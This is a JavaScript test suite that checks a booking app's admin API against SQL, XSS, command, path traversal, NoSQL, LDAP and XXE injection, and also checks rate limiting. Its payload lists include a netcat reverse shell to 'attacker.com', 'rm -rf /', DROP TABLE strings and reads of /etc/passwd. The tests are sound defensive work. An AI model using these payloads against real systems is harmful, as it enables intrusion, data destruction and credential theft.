/**
 * =============================================================================
 * INPUT VALIDATION SECURITY TESTS
 * =============================================================================
 *
 * Tests SQL injection, XSS, command injection, path traversal,
 * and rate limiting protections.
 */

const request = require('supertest');
const { app } = require('../../../src/app');
const { db } = require('../../../src/config/database');
const fixtures = require('../fixtures/security.fixtures');
const helpers = require('../helpers/security-helpers');

describe('Input Validation Security Tests', () => {
  let testData;
  let validToken;

  beforeAll(async () => {
    testData = await fixtures.setupSecurityTest();
    validToken = testData.validToken;
  });

  afterAll(async () => {
    await fixtures.cleanupSecurityTest(testData);
  });

  // ==========================================================================
  // SQL Injection Tests
  // ==========================================================================
  describe('SQL Injection Protection', () => {
    const sqlInjectionPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users--",
      "1' UNION SELECT * FROM salons--",
      "admin'--",
      "' OR 1=1--",
      "' OR 'x'='x",
      "1; DELETE FROM bookings WHERE '1'='1",
      "' UNION SELECT NULL, NULL, NULL--",
      "1' AND '1'='1",
      "' OR EXISTS(SELECT * FROM users WHERE '1'='1')--",
    ];

    it('should reject SQL injection in search parameter', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .get(`/admin/bookings/${testData.salon.id}`)
          .query({ search: payload })
          .set('Authorization', `Bearer ${validToken}`)
          .expect(400);

        expect(response.body.error).toContain('invalid');
      }
    });

    it('should reject SQL injection in filter parameters', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .get(`/admin/bookings/${testData.salon.id}`)
          .query({ status: payload })
          .set('Authorization', `Bearer ${validToken}`)
          .expect(400);
      }
    });

    it('should reject SQL injection in POST body', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .post(`/admin/bookings/${testData.salon.id}`)
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            customer_name: payload,
            customer_phone: '+1234567890',
            service: 'Haircut',
          })
          .expect(400);
      }
    });

    it('should use parameterized queries for database operations', async () => {
      // Create a booking with special characters
      const specialName = "O'Brien & Sons";

      const response = await request(app)
        .post(`/admin/bookings/${testData.salon.id}`)
        .set('Authorization', `Bearer ${validToken}`)
        .send({
          customer_name: specialName,
          customer_phone: '+1234567890',
          service: 'Haircut',
          datetime: new Date().toISOString(),
        })
        .expect(201);

      // Verify it was stored correctly
      const booking = await db.models.Booking.findByPk(response.body.id);
      expect(booking.customer_name).toBe(specialName);
    });

    it('should sanitize ORDER BY clauses', async () => {
      const maliciousSort = "id; DROP TABLE bookings--";

      const response = await request(app)
        .get(`/admin/bookings/${testData.salon.id}`)
        .query({ sort: maliciousSort })
        .set('Authorization', `Bearer ${validToken}`)
        .expect(400);

      expect(response.body.error).toContain('invalid');
    });

    it('should validate numeric IDs', async () => {
      const maliciousId = "1 OR 1=1";

      const response = await request(app)
        .get(`/admin/bookings/${maliciousId}`)
        .set('Authorization', `Bearer ${validToken}`)
        .expect(400);
    });

    it('should prevent second-order SQL injection', async () => {
      // Create booking with malicious data
      const maliciousPhone = "'+OR+1=1--";

      const createResponse = await request(app)
        .post(`/admin/bookings/${testData.salon.id}`)
        .set('Authorization', `Bearer ${validToken}`)
        .send({
          customer_name: 'Test User',
          customer_phone: maliciousPhone,
          service: 'Haircut',
          datetime: new Date().toISOString(),
        })
        .expect(400); // Should reject invalid phone format
    });
  });

  // ==========================================================================
  // XSS (Cross-Site Scripting) Tests
  // ==========================================================================
  describe('XSS Protection', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert(1)>',
      '<svg/onload=alert(1)>',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)">',
      '<body onload=alert(1)>',
      '<input onfocus=alert(1) autofocus>',
      '<select onfocus=alert(1) autofocus>',
      '<textarea onfocus=alert(1) autofocus>',
      '<keygen onfocus=alert(1) autofocus>',
      '<video><source onerror="alert(1)">',
      '<audio src=x onerror=alert(1)>',
      '<details open ontoggle=alert(1)>',
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      "';alert(String.fromCharCode(88,83,83))//",
    ];

    it('should sanitize XSS payloads in customer name', async () => {
      for (const payload of xssPayloads) {
        const response = await request(app)
          .post(`/admin/bookings/${testData.salon.id}`)
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            customer_name: payload,
            customer_phone: '+1234567890',
            service: 'Haircut',
            datetime: new Date().toISOString(),
          });

        if (response.status === 201) {
          // If accepted, verify it was sanitized
          const booking = await db.models.Booking.findByPk(response.body.id);
          expect(booking.customer_name).not.toContain('<script>');
          expect(booking.customer_name).not.toContain('onerror');
          expect(booking.customer_name).not.toContain('javascript:');
        } else {
          // Should be rejected
          expect(response.status).toBe(400);
        }
      }
    });

    it('should sanitize XSS payloads in booking notes', async () => {
      for (const payload of xssPayloads) {
        const response = await request(app)
          .post(`/admin/bookings/${testData.salon.id}`)
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            customer_name: 'Test User',
            customer_phone: '+1234567890',
            service: 'Haircut',
            datetime: new Date().toISOString(),
            notes: payload,
          });

        if (response.status === 201) {
          const booking = await db.models.Booking.findByPk(response.body.id);
          expect(booking.notes).not.toContain('<script>');
          expect(booking.notes).not.toContain('onerror');
        } else {
          expect(response.status).toBe(400);
        }
      }
    });

    it('should set appropriate content security headers', async () => {
      const response = await request(app)
        .get(`/admin/stats/${testData.salon.id}`)
        .set('Authorization', `Bearer ${validToken}`);

      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBeDefined();
    });

    it('should encode output when returning user-generated content', async () => {
      const booking = await fixtures.createTestBooking(testData.salon.id, {
        customer_name: '<b>Bold Name</b>',
        notes: '<em>Emphasized note</em>',
      });

      const response = await request(app)
        .get(`/admin/bookings/${booking.id}`)
        .set('Authorization', `Bearer ${validToken}`)
        .expect(200);

      // HTML should be escaped in JSON response
      const responseText = JSON.stringify(response.body);
      expect(responseText).not.toContain('<b>');
      expect(responseText).not.toContain('<em>');
    });

    it('should validate and sanitize rich text input', async () => {
      const maliciousRichText = `
        <p>Valid paragraph</p>
        <script>alert('XSS')</script>
        <p onclick="alert('XSS')">Another paragraph</p>
      `;

      const response = await request(app)
        .post(`/admin/bookings/${testData.salon.id}`)
        .set('Authorization', `Bearer ${validToken}`)
        .send({
          customer_name: 'Test User',
          customer_phone: '+1234567890',
          service: 'Haircut',
          datetime: new Date().toISOString(),
          notes: maliciousRichText,
        });

      if (response.status === 201) {
        const booking = await db.models.Booking.findByPk(response.body.id);
        expect(booking.notes).not.toContain('<script>');
        expect(booking.notes).not.toContain('onclick');
      }
    });
  });

  // ==========================================================================
  // Command Injection Tests
  // ==========================================================================
  describe('Command Injection Protection', () => {
    const commandInjectionPayloads = [
      '; ls -la',
      '| cat /etc/passwd',
      '&& whoami',
      '$(cat /etc/passwd)',
      '`cat /etc/passwd`',
      '; rm -rf /',
      '| nc -e /bin/sh attacker.com 4444',
      '& ping -c 10 attacker.com',
    ];

    it('should reject command injection in file upload names', async () => {
      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .post(`/admin/upload`)
          .set('Authorization', `Bearer ${validToken}`)
          .attach('file', Buffer.from('test'), payload)
          .expect(400);

        expect(response.body.error).toContain('invalid');
      }
    });

    it('should sanitize file paths', async () => {
      const maliciousPath = '../../../etc/passwd';

      const response = await request(app)
        .get(`/admin/export/${testData.salon.id}`)
        .query({ filename: maliciousPath })
        .set('Authorization', `Bearer ${validToken}`)
        .expect(400);
    });

    it('should validate export format parameter', async () => {
      const maliciousFormat = 'csv; cat /etc/passwd';

      const response = await request(app)
        .get(`/admin/export/${testData.salon.id}`)
        .query({ format: maliciousFormat })
        .set('Authorization', `Bearer ${validToken}`)
        .expect(400);
    });
  });

  // ==========================================================================
  // Path Traversal Tests
  // ==========================================================================
  describe('Path Traversal Protection', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '..;/..;/..;/etc/passwd',
      '/etc/passwd',
      'C:\\Windows\\System32\\config\\sam',
      '../../../../../../etc/passwd',
      './.././.././.././etc/passwd',
    ];

    it('should reject path traversal in file downloads', async () => {
      for (const payload of pathTraversalPayloads) {
        const response = await request(app)
          .get(`/admin/download`)
          .query({ file: payload })
          .set('Authorization', `Bearer ${validToken}`)
          .expect(400);
      }
    });

    it('should validate file paths are within allowed directory', async () => {
      const response = await request(app)
        .get(`/admin/export/${testData.salon.id}`)
        .query({ path: '/tmp/../../etc/passwd' })
        .set('Authorization', `Bearer ${validToken}`)
        .expect(400);
    });

    it('should normalize paths before validation', async () => {
      const response = await request(app)
        .get(`/admin/download`)
        .query({ file: 'reports/./../../secrets.txt' })
        .set('Authorization', `Bearer ${validToken}`)
        .expect(400);
    });
  });

  // ==========================================================================
  // NoSQL Injection Tests (if using MongoDB)
  // ==========================================================================
  describe('NoSQL Injection Protection', () => {
    const nosqlPayloads = [
      { $gt: '' },
      { $ne: null },
      { $regex: '.*' },
      { $where: 'this.password == "password"' },
    ];

    it('should reject NoSQL injection in query parameters', async () => {
      for (const payload of nosqlPayloads) {
        const response = await request(app)
          .get(`/admin/bookings/${testData.salon.id}`)
          .query({ filter: JSON.stringify(payload) })
          .set('Authorization', `Bearer ${validToken}`)
          .expect(400);
      }
    });

    it('should validate object inputs in POST requests', async () => {
      const response = await request(app)
        .post(`/admin/bookings/${testData.salon.id}`)
        .set('Authorization', `Bearer ${validToken}`)
        .send({
          customer_name: { $gt: '' },
          customer_phone: '+1234567890',
        })
        .expect(400);
    });
  });

  // ==========================================================================
  // LDAP Injection Tests
  // ==========================================================================
  describe('LDAP Injection Protection', () => {
    const ldapPayloads = [
      '*',
      '*)(&',
      '*()|&',
      'admin*',
      '*)(uid=*',
    ];

    it('should reject LDAP injection in search fields', async () => {
      for (const payload of ldapPayloads) {
        const response = await request(app)
          .get(`/admin/users`)
          .query({ search: payload })
          .set('Authorization', `Bearer ${validToken}`)
          .expect(400);
      }
    });
  });

  // ==========================================================================
  // XML Injection Tests
  // ==========================================================================
  describe('XML Injection Protection', () => {
    it('should reject XML external entity (XXE) attacks', async () => {
      const xxePayload = `
        <?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <booking>
          <customer>&xxe;</customer>
        </booking>
      `;

      const response = await request(app)
        .post(`/admin/import`)
        .set('Authorization', `Bearer ${validToken}`)
        .set('Content-Type', 'application/xml')
        .send(xxePayload)
        .expect(400);
    });

    it('should disable external entity processing in XML parser', async () => {
      const xxeBillionLaughs = `
        <?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
        ]>
        <booking>&lol2;</booking>
      `;

      const response = await request(app)
        .post(`/admin/import`)
        .set('Authorization', `Bearer ${validToken}`)
        .set('Content-Type', 'application/xml')
        .send(xxeBillionLaughs)
        .expect(400);
    });
  });

  // ==========================================================================
  // Rate Limiting Tests
  // ==========================================================================
  describe('Rate Limiting', () => {
    it('should rate limit excessive requests from same IP', async () => {
      const ipAddress = '192.168.1.200';
      const requests = [];

      // Make 100 requests
      for (let i = 0; i < 100; i++) {
        requests.push(
          request(app)
            .get(`/admin/stats/${testData.salon.id}`)
            .set('Authorization', `Bearer ${validToken}`)
            .set('X-Forwarded-For', ipAddress)
        );
      }

      const responses = await Promise.all(requests);

      // Some should be rate limited (429)
      const rateLimited = responses.filter(r => r.status === 429);
      expect(rateLimited.length).toBeGreaterThan(0);
    });

    it('should rate limit webhook endpoint', async () => {
      const payload = fixtures.createWebhookPayload({
        from: '+1234567890',
        to: testData.salon.phone,
        body: 'Test',
      });

      const signature = helpers.generateWebhookSignature(payload);

      // Make 50 rapid requests
      const requests = [];
      for (let i = 0; i < 50; i++) {
        requests.push(
          request(app)
            .post('/webhook/whatsapp')
            .set('X-Hub-Signature-256', signature)
            .send(payload)
        );
      }

      const responses = await Promise.all(requests);
      const rateLimited = responses.filter(r => r.status === 429);
      expect(rateLimited.length).toBeGreaterThan(0);
    });

    it('should have different rate limits for different endpoints', async () => {
      // Admin endpoints might have higher limits
      const adminRequests = [];
      for (let i = 0; i < 20; i++) {
        adminRequests.push(
          request(app)
            .get(`/admin/stats/${testData.salon.id}`)
            .set('Authorization', `Bearer ${validToken}`)
        );
      }

      const adminResponses = await Promise.all(adminRequests);
      const adminSuccess = adminResponses.filter(r => r.status === 200);
      expect(adminSuccess.length).toBeGreaterThan(0);
    });

    it('should include rate limit headers in response', async () => {
      const response = await request(app)
        .get(`/admin/stats/${testData.salon.id}`)
        .set('Authorization', `Bearer ${validToken}`)
        .expect(200);

      expect(response.headers['x-ratelimit-limit']).toBeDefined();
      expect(response.headers['x-ratelimit-remaining']).toBeDefined();
      expect(response.headers['x-ratelimit-reset']).toBeDefined();
    });

    it('should reset rate limit after time window', async () => {
      // This test would need to wait for rate limit window to reset
      // In practice, you might mock the time or use shorter windows for testing
    });
  });

  // ==========================================================================
  // Input Format Validation
  // ==========================================================================
  describe('Input Format Validation', () => {
    it('should validate email format', async () => {
      const invalidEmails = [
        'notanemail',
        '@example.com',
        'user@',
        'user@.com',
        'user@example',
        '<script>@example.com',
      ];

      for (const email of invalidEmails) {
        const response = await request(app)
          .post(`/admin/contacts`)
          .set('Authorization', `Bearer ${validToken}`)
          .send({ email })
          .expect(400);
      }
    });

    it('should validate phone number format', async () => {
      const invalidPhones = [
        '123',
        'not-a-phone',
        '+1-800-CALL-NOW',
        '(555) 555-5555 ext 123',
        '<script>alert(1)</script>',
      ];

      for (const phone of invalidPhones) {
        const response = await request(app)
          .post(`/admin/bookings/${testData.salon.id}`)
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            customer_name: 'Test',
            customer_phone: phone,
            service: 'Haircut',
            datetime: new Date().toISOString(),
          })
          .expect(400);
      }
    });

    it('should validate date format', async () => {
      const invalidDates = [
        'not-a-date',
        '2024-13-01', // Invalid month
        '2024-01-32', // Invalid day
        'Jan 1, 2024',
        '01/01/2024',
      ];

      for (const datetime of invalidDates) {
        const response = await request(app)
          .post(`/admin/bookings/${testData.salon.id}`)
          .set('Authorization', `Bearer ${validToken}`)
          .send({
            customer_name: 'Test',
            customer_phone: '+1234567890',
            service: 'Haircut',
            datetime,
          })
          .expect(400);
      }
    });

    it('should validate URL format', async () => {
      const invalidUrls = [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'file:///etc/passwd',
        'ftp://malicious.com/upload',
      ];

      for (const url of invalidUrls) {
        const response = await request(app)
          .post(`/admin/webhooks`)
          .set('Authorization', `Bearer ${validToken}`)
          .send({ callback_url: url })
          .expect(400);
      }
    });

    it('should validate integer inputs', async () => {
      const invalidIntegers = [
        'abc',
        '1.5',
        '1e10',
        '0x10',
        'Infinity',
        'NaN',
      ];

      for (const limit of invalidIntegers) {
        const response = await request(app)
          .get(`/admin/bookings/${testData.salon.id}`)
          .query({ limit })
          .set('Authorization', `Bearer ${validToken}`)
          .expect(400);
      }
    });

    it('should enforce maximum length constraints', async () => {
      const veryLongString = 'A'.repeat(10000);

      const response = await request(app)
        .post(`/admin/bookings/${testData.salon.id}`)
        .set('Authorization', `Bearer ${validToken}`)
        .send({
          customer_name: veryLongString,
          customer_phone: '+1234567890',
          service: 'Haircut',
          datetime: new Date().toISOString(),
        })
        .expect(400);

      expect(response.body.error).toContain('length');
    });

    it('should validate JSON structure', async () => {
      const response = await request(app)
        .post(`/admin/bookings/${testData.salon.id}`)
        .set('Authorization', `Bearer ${validToken}`)
        .set('Content-Type', 'application/json')
        .send('{ invalid json }')
        .expect(400);
    });
  });
});
